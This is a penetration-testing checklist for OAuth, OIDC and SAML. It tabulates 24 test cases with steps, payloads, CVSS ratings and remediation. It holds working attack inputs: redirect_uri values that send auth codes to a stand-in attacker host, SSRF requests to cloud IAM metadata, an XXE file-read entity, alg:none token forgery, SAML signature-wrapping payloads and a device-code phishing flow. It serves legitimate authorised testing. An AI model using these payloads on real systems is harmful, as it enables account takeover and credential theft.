# OAuth / OIDC / SAML — Checklist

Expert per-attack **test-case matrix** for OAuth / OIDC / SAML — in testing order, impact-first. All columns preserved (where to inject, steps, expected, payload, impact, severity, CVSS, tools, refs).

*24 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| OAUTH-001 | Fingerprint protocol/grant/IdP + pull discovery | Recon &amp; Fingerprint | The SSO flow (OAuth2/OIDC/SAML), IdP, and all authz params | 1. Identify protocol (OAuth2/OIDC/SAML), grant/flow (auth-code/+PKCE/implicit/hybrid/device), and IdP (Google/MS/Okta/Auth0/Apple/custom).<br>2. Pull OIDC discovery: /.well-known/openid-configuration; save jwks_uri. SAML: SP- vs IdP-initiated.<br>3. Capture ALL authz params (client_id, redirect_uri, response_type, response_mode, scope, state, nonce, code_challenge, prompt) and full SAMLRequest/Response/RelayState decoded. | The exact flow, IdP, keys, and every tamperable parameter are recorded. | <code>curl $IDP/.well-known/openid-configuration &#124; jq . ; capture /authorize?client_id=...&amp;redirect_uri=...</code> | You cannot attack a handshake you haven't fully written down; this scopes every later test. | Info | 0.0 (N/A) | Burp Suite Pro, EsPReSSO, jq | CWE-287; OWASP: OAuth2 / SAML Security Cheat Sheet; RFC 9700 (OAuth Security BCP) |
| OAUTH-002 | redirect_uri bypass -&gt; code/token theft | redirect_uri | The redirect_uri parameter at /authorize | 1. Swap redirect_uri for each bypass: suffix (app.example.com.evil.com), substring, loose subdomain, @-userinfo (app.example.com@evil.com), #fragment, backslash, encoded traversal, localhost/127.0.0.1, empty (fallback-to-registered).<br>2. Path traversal to a reflecting/open-redirect endpoint on the ALLOWED host.<br>3. CRITICAL: confirm the code/token is actually DELIVERED to a host you control - reflection alone is not the bug. | The IdP delivers the victim's code/token to an attacker-controlled host. | <code>redirect_uri=https://app.example.com@$ATTACKER/callback ; .../callback/../redirect?url=https://$ATTACKER</code> | The #1 OAuth bug: victim's auth code/token stolen -&gt; account takeover. Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | poc/oauth_redirect_fuzz.py, Burp | CWE-287; CWE-601; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities |
| OAUTH-003 | redirect_uri parameter pollution | redirect_uri | /authorize accepting duplicate redirect_uri | 1. Send two redirect_uri (validator vs issuer differential): one registered, one attacker.<br>2. Also &amp;redirect_uri=registered%26redirect_uri=attacker.<br>3. Confirm the code lands on your host. | The validator reads the registered URI while the issuer uses the attacker's. | <code>?redirect_uri=https://app.example.com/callback&amp;redirect_uri=https://$ATTACKER/</code> | Code/token theft via parser disagreement -&gt; ATO. Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-287; HackTricks: OAuth to Account Takeover |
| OAUTH-004 | state missing / not-validated / not-bound | state / CSRF | The state parameter across request and callback | 1. Omit state on request AND callback -&gt; still logs in? = CSRF-able.<br>2. Constant/changed state accepted; state from user A's flow accepted in user B's session (not session-bound); predictable state.<br>3. A missing state with NO working CSRF/ATO is Info only. | The callback is accepted without a session-bound state. | <code>GET /callback?code=AAA  (no state) ; reuse userA state in userB session</code> | Enables login CSRF / account-linking ATO (only a finding with a working attack). Medium/High. | Medium | 5.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N) | Burp Repeater | CWE-287; CWE-352; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities |
| OAUTH-005 | Account-linking CSRF -&gt; silent ATO | state / CSRF | A 'link social account' feature with weak/absent state | 1. Capture YOUR OWN code from the link flow; do NOT complete it.<br>2. Send the victim (logged into their account) a pre-baked callback carrying YOUR code: /social/callback?code=&lt;ATTACKER_CODE&gt;.<br>3. Their browser links YOUR identity onto their account -&gt; you log in via social into their account. | The victim's account links to the attacker's social identity on one click. | <code>https://app.example.com/social/callback?code=&lt;ATTACKER_CODE&gt;&amp;state=&lt;if_any&gt;</code> | Silent account takeover via account-linking CSRF - Critical (one victim click). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-287; CWE-352; HackTricks: OAuth to Account Takeover |
| OAUTH-006 | Authorization-code replay | code / PKCE | The /token endpoint | 1. Redeem the code once, then redeem the SAME code again.<br>2. If the second redemption also issues tokens, the code is replayable.<br>3. Re-arms a stolen code even after the victim's client used it. | The same authorization code yields tokens more than once. | <code>POST /oauth/token grant_type=authorization_code code=$CODE ... (repeat) -&gt; tokens again</code> | Code replay extends the window for a stolen code -&gt; ATO. High/Critical. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | curl, Burp Repeater | CWE-287; CWE-384; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities |
| OAUTH-007 | redirect_uri mismatch at /token + cross-client code | code / PKCE | The /token endpoint (RFC 9700 binding checks) | 1. Redeem the code with a DIFFERENT/omitted redirect_uri at /token (must match /authorize per RFC).<br>2. Redeem the code under a different client_id.<br>3. Any acceptance = a binding gap re-arming stolen codes. | The token endpoint accepts a mismatched redirect_uri or a different client for the code. | <code>POST /token code=$CODE redirect_uri=https://$ATTACKER/ client_id=$CID ; or omit redirect_uri</code> | Weak code binding lets a stolen/cross-client code be redeemed -&gt; ATO. High. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | curl | CWE-287; OWASP: OAuth2 / SAML Security Cheat Sheet; RFC 9700 (OAuth Security BCP) |
| OAUTH-008 | PKCE omission / downgrade / verifier not checked | code / PKCE | Public clients using PKCE | 1. At /authorize omit code_challenge, or set code_challenge_method=plain (downgrade).<br>2. At /token redeem with NO code_verifier -&gt; tokens issued? = PKCE optional.<br>3. Redeem with a WRONG code_verifier -&gt; accepted? = not checked. (PKCE absent on a confidential server-side client is NOT a bug.) | The token endpoint issues tokens without a correct code_verifier. | <code>code_challenge_method=plain ; POST /token code=$CODE client_id=$CID  (no/wrong code_verifier)</code> | PKCE bypass re-enables stolen-code ATO on public clients. High. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | poc/oauth_flow_audit.py | CWE-287; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities |
| OAUTH-009 | response_type / response_mode downgrade to leakier channel | response_type / mode | response_type and response_mode at /authorize | 1. Downgrade response_type=code -&gt; token / id_token token (token in #fragment, stealable via open redirect).<br>2. response_mode=form_post -&gt; query (leakier); web_message postMessage -&gt; test listener origin check with prompt=none (silent).<br>3. Confirm the credential moves to a channel you can read. | The credential is delivered via a leakier channel you control. | <code>response_type=token ; response_mode=web_message + prompt=none ; response_mode=query</code> | Moves the token to a stealable channel -&gt; ATO. High/Critical. | High | 7.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N) | Burp Repeater | CWE-287; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities |
| OAUTH-010 | Scope escalation / silent grant (prompt=none) | scope | The scope parameter and prompt=none | 1. Add scopes: scope=openid profile email offline_access admin read:all.<br>2. prompt=none silent auth -&gt; are new scopes granted without consent?<br>3. offline_access -&gt; a long-lived refresh token. | Elevated scopes / a refresh token are granted without user consent. | <code>scope=openid profile email offline_access admin ; prompt=none</code> | Silent scope escalation / persistent refresh-token grant - Medium/High. | Medium | 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) | Burp Repeater | CWE-287; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities |
| OAUTH-011 | OIDC id_token forgery (alg:none / aud / iss / nonce) | OIDC id_token | Wherever the SP consumes an id_token (callback body / id_token param / hybrid) | 1. alg:none - strip the signature and set email=$VICTIM, email_verified=true.<br>2. aud/iss confusion: present an id_token minted for a DIFFERENT client you control; if aud isn't pinned to this client_id -&gt; accepted.<br>3. nonce missing/reused -&gt; replay. kid/jku injection -&gt; attacker JWKS (hand to the JWT kit). | The SP accepts a forged/substituted id_token and logs you in as the victim. | <code>python3 poc/idtoken_tamper.py --token $IDTOKEN --alg-none --set email=$VICTIM --set email_verified=true</code> | Full ATO via id_token forgery/substitution - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | poc/idtoken_tamper.py, jwt_tool | CWE-287; CWE-347; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities |
| OAUTH-012 | Unverified email / email_verified:false trusted | Trust &amp; Linking | SSO callback that links/authenticates by email | 1. Does the SP honor email_verified:false or ignore it entirely?<br>2. Sign in via an IdP where you set an unverified email matching a victim.<br>3. If the app links by email without re-verification -&gt; takeover. | The app authenticates/links based on an unverified email claim. | <code>id_token email=$VICTIM email_verified=false -&gt; app still links/logs in</code> | ATO via trusted-unverified-email - Critical, no crypto needed. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-287; HackTricks: OAuth to Account Takeover |
| OAUTH-013 | Pre-account-takeover (seed victim email first) | Trust &amp; Linking | Apps that merge password + SSO accounts by email | 1. Register $VICTIM (an email you own) by PASSWORD before the victim.<br>2. Victim later 'Sign in with Google/OIDC' as that email.<br>3. SP merges by email -&gt; shared account, YOUR password persists -&gt; ATO. Check: honors email_verified:false? links without re-verification? | The pre-seeded password account merges with the victim's SSO login. | <code>1) register $VICTIM by password  2) victim SSOs in  3) accounts merge, attacker password persists</code> | Zero/one-click Critical ATO frequently missed - the highest-value no-crypto SSO bug. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-287; HackTricks: OAuth to Account Takeover |
| OAUTH-014 | IdP mix-up / confused deputy / dynamic client reg | Trust &amp; Linking | Multi-IdP apps; the iss response param; dynamic client registration | 1. IdP mix-up: the iss response param not checked -&gt; a token from a low-trust IdP accepted.<br>2. Confused deputy: token audience not pinned -&gt; a token for another client accepted.<br>3. Open dynamic client registration abused to register a malicious client. | A token/identity from the wrong IdP/client/audience is accepted. | <code>swap iss to attacker IdP ; reuse an id_token whose aud is another client</code> | Cross-IdP identity confusion -&gt; ATO - High/Critical. | High | 7.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N) | Burp Repeater | CWE-287; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities |
| OAUTH-015 | request_uri / JAR SSRF from the IdP | SSRF | The request_uri parameter at /authorize | 1. Point request_uri at your OOB to confirm a server-side fetch.<br>2. Escalate to cloud metadata: request_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/ ; file:///etc/passwd.<br>3. One benign metadata request, then STOP (hand to SSRF kit). | The IdP fetches your internal/metadata URL; IAM creds returned. | <code>GET /authorize?client_id=X&amp;request_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> | SSRF from the IdP -&gt; cloud IAM credential theft - Critical. | Critical | 9.9 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L) | interactsh, SSRFmap | CWE-287; CWE-918; HackTricks: OAuth to Account Takeover |
| OAUTH-016 | SAML signature exclusion / stripping | SAML | The SAMLResponse assertion | 1. Remove the entire &lt;ds:Signature&gt; block, set NameID to a target (admin@target.com), resubmit.<br>2. Also: an UNSIGNED assertion inside a signed Response trusted?<br>3. Many SPs fall to strip immediately - try it first. | The SP accepts an assertion with no/removed signature. | <code>delete &lt;ds:Signature&gt; ; &lt;saml:NameID&gt;admin@target.com&lt;/saml:NameID&gt; ; re-base64 -&gt; POST</code> | Authentication bypass / log in as any identity via signature stripping - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SAML Raider, poc/saml_xsw.py | CWE-287; CWE-347; HackTricks: OAuth to Account Takeover |
| OAUTH-017 | SAML XML Signature Wrapping (XSW 1-8) | SAML | The SAMLResponse (signed) assertion | 1. Inject a forged assertion so the signature references the original but the app reads the forged one.<br>2. Run all 8 XSW patterns (SAML Raider): sibling Response/Assertion, before/after, copied signature, hidden-in-Extensions.<br>3. Set NameID to your target; at least one variant is often accepted. | An XSW-wrapped forged assertion is trusted while the signature validates the original. | <code>SAML Raider -&gt; apply XSW1..8 with NameID=admin@target.com</code> | Log in as any identity via signature wrapping - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SAML Raider, poc/saml_xsw.py | CWE-287; CWE-347; PayloadsAllTheThings/OAuth |
| OAUTH-018 | SAML comment / canonicalization injection in NameID | SAML | The NameID element | 1. Insert an XML comment to split the parsed value: admin@target.com&lt;!----&gt;.evil.com.<br>2. Some parsers return only the pre-comment text -&gt; the SP sees admin@target.com.<br>3. Resubmit and confirm login as the truncated identity. | A comment causes the parser to read a different NameID than was signed. | <code>&lt;saml:NameID&gt;admin@target.com&lt;!--x--&gt;evil&lt;/saml:NameID&gt;</code> | Log in as another user via canonicalization/comment parsing - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SAML Raider | CWE-287; HackTricks: OAuth to Account Takeover |
| OAUTH-019 | SAML cert faking / key confusion + algorithm downgrade | SAML | The &lt;ds:X509Certificate&gt; / SignatureMethod | 1. Re-sign the full assertion with YOUR key; replace &lt;ds:X509Certificate&gt; with YOUR cert.<br>2. If the SP validates against the EMBEDDED cert (not a pinned IdP cert) -&gt; total forge.<br>3. Also test algorithm downgrade / weak alg. | The SP validates against the attacker-embedded cert, accepting a fully forged assertion. | <code>xmlsec1 re-sign with attacker key + swap &lt;ds:X509Certificate&gt; ; downgrade SignatureMethod</code> | Total assertion forgery -&gt; log in as anyone - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SAML Raider, xmlsec1 | CWE-287; CWE-347; HackTricks: OAuth to Account Takeover |
| OAUTH-020 | SAML replay / binding / RelayState / XXE | SAML | SAMLResponse timing, Recipient/Destination/Audience, InResponseTo, RelayState, XML parser | 1. Replay a captured SAMLResponse in a fresh session / after logout; check NotBefore/NotOnOrAfter enforcement.<br>2. Cross-SP replay: change Recipient/Destination/Audience; strip InResponseTo (IdP-initiated injection).<br>3. RelayState=https://$ATTACKER (open redirect) / "&gt;&lt;script&gt; (XSS). XXE in the SAML parser (DOCTYPE entity -&gt; file read/OOB). | The SP accepts a replayed/cross-SP assertion, or RelayState/XXE is exploitable. | <code>resubmit SAMLResponse after logout ; RelayState=https://$ATTACKER ; &lt;!DOCTYPE[&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;</code> | Assertion replay / cross-SP ATO / open-redirect / XXE file-read - High/Critical. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | SAML Raider, interactsh | CWE-287; CWE-611; CWE-601; HackTricks: OAuth to Account Takeover |
| OAUTH-021 | False-positive filter / auto-reject | Validation &amp; Reporting | Before reporting any candidate | 1. REJECT: 'state missing' with NO working CSRF/ATO (Info only); redirect_uri REFLECTED but code/token NOT delivered to you; id_token readable / SAML base64-visible (normal); a tampered assertion the server REJECTED; PKCE absent on a CONFIDENTIAL client; a SAMLResponse that 'replays' only in the SAME browser session.<br>2. REQUIRE: you actually LOGGED IN as an identity you shouldn't have. | Only findings where you logged in as an unauthorized identity survive. | <code>reflected redirect_uri = not delivered = FP ; readable id_token = normal ; rejected assertion = FP</code> | Protects credibility; SSO is dense with observation-mistaken-for-exploit false positives. | Info | 0.0 (N/A) | manual | CWE-287; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities |
| OAUTH-022 | Client-facing impact &amp; SAFE-PoC package | Validation &amp; Reporting | Confirmed finding, pre-submission | 1. Lead with impact: account takeover; confirm reach (all users/admin) and interaction (zero/one-click); note SSO ATO usually SKIPS MFA (argue severity up).<br>2. Provide the tampered request/assertion and proof you logged in as the victim (or landed the code/token on your listener).<br>3. Set CVSS 3.1 + CWE-287 (+601/918/347/352). Remediation: exact-match registered redirect_uri, enforce session-bound state + nonce + PKCE, pin aud/iss, verify signatures (reject alg:none/XSW/unsigned), require verified email before linking, pin the IdP cert.<br>4. Own accounts only, exfil to your listener, one benign SSRF/metadata request then STOP, delete seeded accounts; de-dupe. | A reproducible, correctly-rated, safe two-account PoC with clear remediation. | <code>PoC: tampered request/assertion + proof of login-as-victim (or code on listener) + CVSS + CWE-287 + remediation.</code> | Converts the ATO into a defensible Critical report at the right severity (MFA-bypass argued). | Info | 0.0 (N/A) | CVSS calculator, OAUTH_REPORT_TEMPLATE.md | CWE-287; CWE-601; CWE-347; FIRST CVSS v3.1; OWASP: OAuth2 / SAML Security Cheat Sheet; RFC 9700 (OAuth Security BCP)  &#124;  TOP REFERENCES: Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; epi052 SAML research; PayloadsAllTheThings |
| OAUTH-023 | Device authorization code phishing (RFC 8628) | code / PKCE | Device-code flow (user_code / verification_uri) | 1. Start the device flow; obtain user_code + verification_uri<br>2. Phish the victim to approve the user_code on the real site<br>3. Poll /token; obtain the victim's access/refresh token<br>4. Note the missing device&lt;-&gt;approver binding and unclear app/scope | Device flow shows app+scope, binds approval to the device, rate-limits polling | <code>POST /oauth/device/code -&gt; phish user_code -&gt; poll grant_type=urn:ietf:params:oauth:grant-type:device_code</code> | Device-code phishing -&gt; victim-approved token issuance -&gt; account takeover | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp, custom poller | CWE-287; RFC 8628; Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research |
| OAUTH-024 | Account-linking CSRF (bind attacker identity to victim) | Trust &amp; Linking | OAuth link/connect endpoint under cookie auth (missing state) | 1. Begin linking your attacker OAuth identity; capture the link callback<br>2. Confirm the linking endpoint lacks a state/CSRF token<br>3. Deliver the callback to a logged-in victim (cross-site)<br>4. Victim's account is now linked to the attacker identity -&gt; attacker logs in as victim | Linking endpoint enforces a state/CSRF token + re-auth of the primary account | <code>GET /oauth/link/callback?code=&lt;attacker_code&gt;  fired cross-site at a logged-in victim</code> | Account-linking CSRF -&gt; attacker OAuth identity bound to victim account -&gt; ATO | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp | CWE-352; CWE-287; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger OAuth; disclosed pre-linking ATO writeups |
